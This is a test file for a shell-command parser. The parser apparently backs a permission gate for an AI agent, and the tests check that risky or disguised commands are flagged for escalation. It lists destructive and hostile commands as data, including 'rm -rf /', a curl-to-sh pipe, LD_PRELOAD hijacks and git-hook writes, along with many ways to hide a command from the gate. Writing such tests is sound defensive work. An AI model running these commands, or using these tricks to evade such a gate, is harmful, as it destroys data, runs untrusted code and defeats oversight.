import { describe, expect, it } from "vitest";
import { commandLine, parseShell } from "../../src/policy/shell.ts";

function names(command: string): string[] {
	return parseShell(command).commands.map((cmd) => cmd.name);
}

function lines(command: string): string[] {
	return parseShell(command).commands.map(commandLine);
}

describe("parseShell", () => {
	it("parses a single command", () => {
		const parsed = parseShell("git status --short");
		expect(parsed.commands).toHaveLength(1);
		expect(parsed.commands[0]?.name).toBe("git");
		expect(parsed.commands[0]?.args).toEqual(["status", "--short"]);
		expect(parsed.confident).toBe(true);
	});

	// Every simple command is matched separately, so a rule about `rm` is not
	// defeated by putting something harmless in front of it. This is the whole
	// reason the tokenizer splits at all.
	it.each([
		["a && b", ["a", "b"]],
		["a || b", ["a", "b"]],
		["a | b", ["a", "b"]],
		["a ; b", ["a", "b"]],
		["a & b", ["a", "b"]],
		["a\nb", ["a", "b"]],
		["echo ok && rm -rf /", ["echo", "rm"]],
	])("splits %s", (command, expected) => {
		expect(names(command)).toEqual(expected);
	});

	it("does not split inside quotes", () => {
		expect(names('echo "a && b"')).toEqual(["echo"]);
		expect(names("echo 'a | b'")).toEqual(["echo"]);
	});

	it("normalizes quoting and whitespace in the matched line", () => {
		expect(lines('rm  -rf   "/tmp/x"')).toEqual(["rm -rf /tmp/x"]);
	});

	describe("redirects", () => {
		it.each([
			["cat x > out", ">", "out"],
			["cat x >> out", ">>", "out"],
			["cat x >out", ">", "out"],
			["cmd 2> err", "2>", "err"],
			["cmd &> both", "&>", "both"],
			["cmd <> read-write", "<>", "read-write"],
			["cmd 1<>read-write", "1<>", "read-write"],
		])("pulls %s out of the arguments", (command, op, target) => {
			const parsed = parseShell(command);
			expect(parsed.commands[0]?.redirects).toEqual([{ op, target, writes: true }]);
			expect(parsed.commands[0]?.args).not.toContain(target);
		});

		it("treats an input redirect as a read", () => {
			expect(parseShell("cmd < in").commands[0]?.redirects[0]?.writes).toBe(false);
		});

		it("treats a read-write redirect as a write", () => {
			expect(parseShell("cmd 1<>target").commands[0]?.redirects).toEqual([
				{ op: "1<>", target: "target", writes: true },
			]);
		});

		// `&>` is a redirect, not a background-and-then. Splitting there would
		// invent a second command out of the filename.
		it("does not split on the & of &>", () => {
			expect(names("cmd &> out")).toEqual(["cmd"]);
		});
	});

	it("separates environment assignment prefixes from the command name", () => {
		const parsed = parseShell("FOO=1 BAR=2 make build");
		expect(parsed.commands[0]?.assignments).toEqual(["FOO=1", "BAR=2"]);
		expect(parsed.commands[0]?.name).toBe("make");
	});

	// Being loudly unsure is the only safe failure mode: the gate escalates a
	// non-confident parse instead of trusting it.
	describe("confidence", () => {
		it.each([
			["echo $(whoami)", "command-substitution"],
			["echo `whoami`", "backtick"],
			["diff <(a) <(b)", "process-substitution"],
			["cat <<EOF", "heredoc"],
			['eval "$CMD"', "eval"],
			["ls | xargs rm", "xargs"],
			["sh -c 'rm -rf /'", "shell-c"],
			["bash -c 'x'", "shell-c"],
			["PATH=/tmp/agent-bin git status", "environment-assignment"],
			["LD_PRELOAD=/work/agent.so true", "environment-assignment"],
			["echo 'unterminated", "unbalanced-quote"],
		])("%s is not confident (%s)", (command, marker) => {
			const parsed = parseShell(command);
			expect(parsed.confident).toBe(false);
			expect(parsed.markers).toContain(marker);
		});

		it("an ordinary command is confident", () => {
			expect(parseShell("git status --short && ls").confident).toBe(true);
		});

		it("a shell script is opaque too", () => {
			expect(parseShell("sh ./deploy.sh").confident).toBe(false);
		});
	});

	it("ignores empty segments from trailing separators", () => {
		expect(names("ls ; ")).toEqual(["ls"]);
	});

	// A redirect glued to the preceding word was kept as one token, so the target
	// was never seen as a write and protectedPaths never fired.
	describe("glued redirects", () => {
		it("splits an operator joined to a word", () => {
			const parsed = parseShell("cat payload>>.git/hooks/pre-commit");
			expect(parsed.commands[0]?.name).toBe("cat");
			expect(parsed.commands[0]?.redirects).toEqual([{ op: ">>", target: ".git/hooks/pre-commit", writes: true }]);
		});

		it("keeps an fd prefix on the operator", () => {
			expect(parseShell("cmd 2>err").commands[0]?.redirects).toEqual([{ op: "2>", target: "err", writes: true }]);
			expect(parseShell("cmd 2>>err").commands[0]?.redirects[0]?.op).toBe("2>>");
		});

		it("does not split process substitution as a glued redirect", () => {
			// The `<(` guard keeps the new word-splitting from firing; process
			// substitution is non-confident anyway, which is what actually matters.
			expect(parseShell("diff <(a) <(b)").confident).toBe(false);
		});
	});

	// A command wrapper hides the real command from a rule anchored on it, so it
	// is marked non-confident and the gate escalates rather than guess.
	describe("wrappers", () => {
		it.each([
			["env rm -rf /", "env"],
			["nohup sudo sh", "nohup"],
			["timeout 30 rm -rf .", "timeout"],
			["/usr/bin/env curl x", "path-qualified env"],
			["bash -lc 'git push'", "clustered -lc"],
			["builtin eval 'git reset --hard'", "builtin"],
			["env -S 'git reset --hard'", "env -S"],
		])("%s is not confident (%s)", (command) => {
			expect(parseShell(command).confident).toBe(false);
		});

		it("bare env with no command stays confident", () => {
			expect(parseShell("env").confident).toBe(true);
		});
	});

	// A backslash-newline is a line continuation the shell deletes; keeping it as
	// a literal newline left a confident parse whose command line matched no rule.
	describe("line continuation", () => {
		it("joins the lines so the command matches", () => {
			const parsed = parseShell("rm \\\n-rf /work/.git");
			expect(parsed.confident).toBe(true);
			expect(parsed.commands.map(commandLine)).toEqual(["rm -rf /work/.git"]);
		});
	});

	// A parameter expansion in command position reconstructs the command from a
	// value the tokenizer cannot see; it must escalate rather than parse it away.
	describe("parameter expansion", () => {
		// biome-ignore lint/suspicious/noTemplateCurlyInString: these are shell parameter expansions under test, not JS template placeholders
		it.each(["$c -rf /x", "git${IFS}push${IFS}--force", "${cmd} arg", "a${IFS}b"])("%s is not confident", (command) => {
			expect(parseShell(command).confident).toBe(false);
		});

		// Argument expansion can select a sensitive dispatcher verb or path.
		it.each(["echo $HOME", "npm run $script", "cat $file", 'x=reset; git "$x" --hard'])(
			"%s is not confident",
			(command) => {
				expect(parseShell(command).confident).toBe(false);
			},
		);

		it.each(['TARGET=.github/workflows/ci.yml; echo pwn > "$TARGET"', 'tee "$TARGET"', "dd if=/dev/zero of=$TARGET"])(
			"%s escalates because a write target is expanded",
			(command) => {
				const parsed = parseShell(command);
				expect(parsed.confident).toBe(false);
				expect(parsed.markers).toContain("param-expansion");
			},
		);
	});

	describe("hidden filesystem effects", () => {
		it.each([
			["cd .pi && touch extensions/x", "cwd-change"],
			['python3 -c \'open(".pi/extensions/x", "w")\'', "interpreter"],
			["node build.js", "interpreter"],
			["nodejs -e 'process.exit()'", "interpreter"],
			["/usr/bin/nodejs -e 'process.exit()'", "interpreter"],
			["python3.12 deploy.py", "interpreter"],
			["ruby3.3 deploy.rb", "interpreter"],
			["lua5.4 deploy.lua", "interpreter"],
			[". ./deploy.sh", "source-script"],
			["source ./deploy.sh", "source-script"],
			["npm run deploy", "script-runner"],
			["./deploy.sh", "workspace-executable"],
			["find . -exec git reset --hard ';'", "command-dispatch"],
			["sed -n 'e git reset --hard' /dev/null", "command-dispatch"],
			["busybox sh -c 'git reset --hard'", "command-dispatch"],
			["fish -c 'git reset --hard'", "shell-c"],
			["trap 'git reset --hard' EXIT", "command-dispatch"],
			["cmake -P agent.cmake", "script-runner"],
			["printf x | awk 'system(\"git reset --hard\")'", "interpreter"],
			["R -e 'system(\"git reset --hard\")'", "interpreter"],
			["/usr/bin/../../work/evil", "workspace-executable"],
			["printf 'git reset --hard\\n' | sh", "shell-c"],
			["sh < ./agent-script", "shell-c"],
			["tar -xf payload.tar", "archive-extract"],
			["printf x > .pi/extensions/*", "pathname-expansion"],
			["touch reset; git r?set --hard", "pathname-expansion"],
			["touch git; gi? reset --hard", "pathname-expansion"],
		])("%s is not confident (%s)", (command, marker) => {
			const parsed = parseShell(command);
			expect(parsed.confident).toBe(false);
			expect(parsed.markers).toContain(marker);
		});
	});

	// Compound and path-qualified forms the policy does not model must escalate
	// rather than parse away.
	describe("unsupported forms escalate", () => {
		it.each([
			"! sudo id",
			"(cd /x && rm -rf /)",
			"if true; then rm -rf /; fi",
			"for f in *; do rm $f; done",
			"echo x >| /work/.git/config",
			"cat $DIR/../.ssh/id",
		])("%s is not confident", (command) => {
			expect(parseShell(command).confident).toBe(false);
		});

		it("records the connector between commands", () => {
			expect(parseShell("a && b").commands[1]?.connector).toBe("&&");
			expect(parseShell("a || b").commands[1]?.connector).toBe("||");
			expect(parseShell("a | b").commands[1]?.connector).toBe("|");
			expect(parseShell("a").commands[0]?.connector).toBeUndefined();
		});
	});

	// #14. A quote inside a comment used to open a span that swallowed every
	// line up to the next quote in a later comment, so a script parsed as one
	// confident command named by its first line.
	describe("comments", () => {
		it.each([
			["ls # don't\ngit push --force origin main # won't", ["ls", "git push --force origin main"]],
			['ls # say "hi"\nchmod 777 x # "bye"', ["ls", "chmod 777 x"]],
			["ls # a `tick\nrm -rf src # another `tick", ["ls", "rm -rf src"]],
			["cat README.md # it's\nrm -rf src\n# it's", ["cat README.md", "rm -rf src"]],
			["ls # trailing comment", ["ls"]],
			["ls;# glued to a separator ' quote\nwc -l x", ["ls", "wc -l x"]],
			["ls\n\n# a line of its own\n  # indented\nwc -l x", ["ls", "wc -l x"]],
			["ls # a comment ending in a backslash \\\nwc -l x", ["ls", "wc -l x"]],
		])("drops the comment in %j", (command, expected) => {
			const parsed = parseShell(command);
			expect(parsed.commands.map(commandLine)).toEqual(expected);
			expect(parsed.confident).toBe(true);
		});

		it.each([
			["echo '# not a comment'", ["echo # not a comment"]],
			['echo "# not a comment"', ["echo # not a comment"]],
			["echo a#b", ["echo a#b"]],
			["echo \\#x", ["echo #x"]],
			["echo {#,x}", ["echo {#,x}"]],
		])("keeps a # that does not start a word or is quoted: %j", (command, expected) => {
			expect(parseShell(command).commands.map(commandLine)).toEqual(expected);
		});

		// Bash starts a word only after space, tab, newline or a metacharacter. A
		// `#` after any other whitespace-like character is literal, and the rest
		// of the line runs, so those characters make the parse non-confident.
		it.each(["\r", "\f", "\v", "\u00a0", "\u2028", "\u3000", "\ufeff", "\u0000", "\u001b"])(
			"a # after %j does not start a comment, and the parse is not confident",
			(char) => {
				const parsed = parseShell(`echo a${char}#b; git push --force origin main`);
				expect(parsed.confident).toBe(false);
				expect(parsed.markers).toContain("unusual-whitespace");
				expect(parsed.commands.map((cmd) => cmd.name)).toContain("git");
			},
		);

		it("keeps $# and the length expansion, which are not comments", () => {
			// biome-ignore lint/suspicious/noTemplateCurlyInString: shell parameter expansion under test
			const parsed = parseShell("echo $# ${#x}");
			// biome-ignore lint/suspicious/noTemplateCurlyInString: shell parameter expansion under test
			expect(parsed.commands[0]?.args).toEqual(["$#", "${#x}"]);
			expect(parsed.markers).toContain("param-expansion");
		});

		it("a heredoc body containing # stays non-confident", () => {
			const parsed = parseShell("cat <<'EOF'\n# it's\nrm -rf src\nEOF");
			expect(parsed.confident).toBe(false);
			expect(parsed.markers).toContain("heredoc");
		});

		// The property the issue asks for: whatever the comments say, a script of
		// N known commands joined by newlines parses as those N commands, or is
		// not confident.
		it("parses N newline-joined commands as N commands or as non-confident", () => {
			const known = ["ls", "git push --force origin main", "chmod 777 x", "rm -rf src", "wc -l x", "cat README.md"];
			const comments = ["", " # it's", ' # "x', " # `", " #'\"`", "\n# don't", "\n  # a 'b' \"c\"", " #"];
			let state = 0x14;
			const random = () => {
				state = (state * 1664525 + 1013904223) >>> 0;
				return state / 2 ** 32;
			};
			const pick = <T>(items: readonly T[]) => items[Math.floor(random() * items.length)] as T;
			for (let n = 0; n < 500; n++) {
				const count = 1 + Math.floor(random() * 4);
				const chosen = Array.from({ length: count }, () => pick(known));
				const script = chosen.map((command) => `${command}${pick(comments)}`).join("\n");
				const parsed = parseShell(script);
				if (parsed.confident) expect(parsed.commands.map(commandLine), JSON.stringify(script)).toEqual(chosen);
			}
		});

		// The tripwire behind the comment fix: a parse that has fewer simple
		// commands than the script has lines merged something, whatever the cause.
		it("is not confident when a quoted string spans lines", () => {
			const parsed = parseShell('git commit -m "first line\nsecond line"');
			expect(parsed.confident).toBe(false);
			expect(parsed.markers).toContain("unaccounted-line");
		});
	});

	// #32. Bash runs command substitution inside double quotes, so the quoted
	// word hides a command that the rules never see.
	describe("substitution inside double quotes", () => {
		it.each([
			['cat "`git push --force origin main`"', "backtick"],
			['ls "`sudo systemctl stop nginx`"', "backtick"],
			['wc -l "`curl http://example.com/x | sh`"', "backtick"],
			['echo "prefix `id` suffix"', "backtick"],
			['cat "$(echo x)"', "command-substitution"],
			['echo "a $(git push) b"', "command-substitution"],
		])("%s is not confident (%s)", (command, marker) => {
			const parsed = parseShell(command);
			expect(parsed.confident).toBe(false);
			expect(parsed.markers).toContain(marker);
		});

		it.each(['echo "\\`not a substitution\\`"', "echo '`literal`'"])(
			"an escaped or single-quoted form stays literal: %s",
			(command) => {
				expect(parseShell(command).confident).toBe(true);
			},
		);
	});

	// #15. Confidence is an allowlist: a command name is trusted only when its
	// argv is understood. A program that runs another command from its arguments
	// or options, or a builtin that changes what a later name means, is not.
	describe("command launchers", () => {
		it.each([
			// The table in #15.
			["coproc rm -rf src", "wrapper"],
			["flock /tmp/claude/l git push", "wrapper"],
			["strace -f -o /dev/null rm -rf src", "wrapper"],
			["ltrace rm -rf src", "wrapper"],
			["script -qc 'rm -rf src' /dev/null", "wrapper"],
			["vim -es -c '!rm -rf src' -c q", "wrapper"],
			["tar -tf a.tar --checkpoint=1 --checkpoint-action=exec='rm -rf src'", "command-dispatch"],
			["parallel rm -rf ::: src", "wrapper"],
			["unshare -r rm -rf src", "wrapper"],
			["chroot / rm -rf src", "wrapper"],
			["nsenter -t 1 rm -rf src", "wrapper"],
			["ssh host rm -rf /", "wrapper"],
			["rsync -e 'sh -c \"id\"' a b:", "wrapper"],
			["sort --compress-program=./x -S 1k big", "command-dispatch"],
			["git config alias.st '!rm -rf src'", "command-dispatch"],
			["git st", "command-dispatch"],
			["hash -p /usr/bin/rm ls", "shell-state"],
			["hash -p /usr/bin/rm ls\nls -rf src", "shell-state"],
			["shopt -s expand_aliases\nalias ls='rm -rf'\nls src", "shell-state"],
			["alias ls='rm -rf'", "shell-state"],
			// The comment on #15.
			["man -P 'echo PWNED' ls", "wrapper"],
			["git grep -O'echo PWNED' x", "command-dispatch"],
			["git diff --ext-diff", "command-dispatch"],
			["git submodule foreach 'git config core.fsmonitor /work/x.sh'", "command-dispatch"],
			// The same family, named in #15.
			["fc -s", "wrapper"],
			["less +'!id' README.md", "wrapper"],
			["gdb -batch -ex 'shell id'", "wrapper"],
			["sudo id", "wrapper"],
			["export PATH=/work/bin:$PATH", "shell-state"],
			["declare -x LD_PRELOAD=/work/x.so", "shell-state"],
			["set -o vi", "shell-state"],
			// Review of #43: a shell or launcher with no arguments runs what reaches
			// its stdin, which need not be a visible `|`.
			["cat a |& sh", "shell-c"],
			["echo 'touch x' |\nsh", "shell-c"],
			["echo x > f; exec < f; sh", "shell-c"],
			["echo x > f; exec < f; sh", "shell-state"],
			["bash", "shell-c"],
			["echo ':!touch x' | ex", "wrapper"],
			["ex < f", "wrapper"],
			["vim", "wrapper"],
			["gdb", "wrapper"],
			["script", "wrapper"],
			["unshare", "wrapper"],
			["nsenter", "wrapper"],
			["cat x | less", "wrapper"],
			// An unlisted program may launch another one; it is not trusted.
			["pytest -q", "unknown-command"],
			["curl -s http://localhost:8080/", "unknown-command"],
			["mystery-tool --run 'rm -rf src'", "unknown-command"],
		])("%j is not confident (%s)", (command, marker) => {
			const parsed = parseShell(command);
			expect(parsed.confident).toBe(false);
			expect(parsed.markers).toContain(marker);
		});

		// The practical complement to the differential test, which cannot see
		// commands a program runs itself: every option of a known binary that
		// takes a command, in the spellings the program accepts.
		it.each([
			"sort --compress-program=gzip x",
			"sort --compress-program gzip x",
			"sort --compress=gzip x",
			"sort --co=gzip x",
			"split --filter='./x' big",
			"split --fi=./x big",
			"tar -cf a.tar --to-command=./x .",
			"tar -xf a.tar --to-c=./x",
			"tar -cf a.tar --use-compress-program=./x .",
			"tar -cf a.tar -I ./x .",
			"tar -cIf ./x a.tar .",
			"tar cIf ./x a.tar .",
			"tar -tf a.tar --checkpoint-action=exec=./x",
			"tar -tf a.tar --checkpoint-a=exec=./x",
			"tar -tf a.tar --checkpoint-=exec=./x",
			"tar -cf host:a.tar --rs=./x .",
			"tar -cf a.tar --inf=./x .",
			"tar -cf a.tar --new-=./x .",
			"tar -cf host:a.tar --rsh-command=./x .",
			"tar -cf a.tar --rmt-command=./x .",
			"tar -cf a.tar -F ./x .",
			"tar -cf a.tar --info-script=./x .",
			"tar -cf a.tar --new-volume-script=./x .",
			"rg --pre ./x pattern",
			"rg --pre=./x pattern",
			"rg --hostname-bin=./x pattern",
			"git grep -O pattern",
			"git grep --open-files-in-pager=./x pattern",
			"git log --ext-diff -p",
			"git show --ext-diff",
			"git difftool -x ./x",
			"git mergetool --tool-help",
			"git rebase -x ./x main",
			"git rebase --exec=./x main",
			"git rebase --exe=./x main",
			"git fetch --upload-p=./x origin",
			"git clone -u ./x origin dir",
			"git ls-remote -u ./x origin",
			"git rebase -ix ./x main",
			"git bisect run ./x",
			"git submodule foreach ./x",
			"git submodule --quiet foreach ./x",
			"git fetch --upload-pack=./x origin",
			"git push --receive-pack=./x origin",
			"git ls-remote --upload-pack ./x origin",
			"git -c core.pager=./x log",
			"git --exec-path=/work log",
			"git config core.pager ./x",
			"git config --global core.editor ./x",
			"git config set core.hooksPath hooks",
			"git config core.hooksPath list",
			"git config core.hooksPath get",
			"git config core.pager --list",
			"git config --file --get core.pager ./x",
			"git filter-branch --tree-filter ./x",
			"gh extension exec x",
			"gh alias set co 'pr checkout'",
			"gh codespace ssh",
			"gh my-extension",
			"gh pr view 6 --web",
			"gh repo view -w",
			"read PATH < /work/p",
			"printf -v PATH /work/bin",
			"wait -p PATH",
			"find . -exec ./x ';'",
			"find . -execdir ./x ';'",
			"find . -ok ./x ';'",
			"find . -okdir ./x ';'",
		])("%s is not confident", (command) => {
			expect(parseShell(command).confident).toBe(false);
		});

		// The allowlist must not swallow the ordinary forms of the same tools.
		it.each([
			"git status --short",
			"git log --oneline -5",
			"git diff HEAD~1",
			"git config --get user.name",
			"git config --list",
			"git config --global --get user.name",
			"git config get user.name",
			"git config list",
			"git grep -n pattern",
			"git rebase main",
			"git submodule status",
			"git bisect start",
			"gh pr view 6",
			"sort -u names.txt",
			"tar -tf a.tar",
			"rg -n pattern src",
			"find . -name README.md",
			"set -euo pipefail\nls",
			"mkdir -p build && touch build/x && cp a b && mv b c && rm -f c",
			"chmod +x x && ln -s a b",
			"echo ok | tee out.txt",
		])("%s stays confident", (command) => {
			const parsed = parseShell(command);
			expect(parsed.markers).toEqual([]);
			expect(parsed.confident).toBe(true);
		});
	});

	it("preserves quote syntax while normalizing harmless whitespace", () => {
		expect(parseShell('rm  "*"').commands[0]?.syntax).toBe('rm "*"');
		expect(parseShell("rm  *").commands[0]?.syntax).toBe("rm *");
	});

	// Regressions from the glued-redirect splitter.
	describe("redirect fidelity", () => {
		it("keeps trailing digits that belong to an argument, not an fd", () => {
			const parsed = parseShell("cat report2>out");
			expect(parsed.commands[0]?.args).toEqual(["report2"]);
			expect(parsed.commands[0]?.redirects).toEqual([{ op: ">", target: "out", writes: true }]);
		});

		it("treats a bare digit token as an fd", () => {
			expect(parseShell("cmd 2>out").commands[0]?.redirects[0]?.op).toBe("2>");
		});

		it("records &>> and >& targets as writes", () => {
			expect(parseShell("cmd &>>secret.txt").commands[0]?.redirects).toEqual([
				{ op: "&>>", target: "secret.txt", writes: true },
			]);
			expect(parseShell("cmd &>> secret.txt").commands[0]?.redirects[0]?.target).toBe("secret.txt");
			expect(parseShell("cmd >&secret.txt").commands[0]?.redirects[0]).toEqual({
				op: ">&",
				target: "secret.txt",
				writes: true,
			});
		});
	});
});
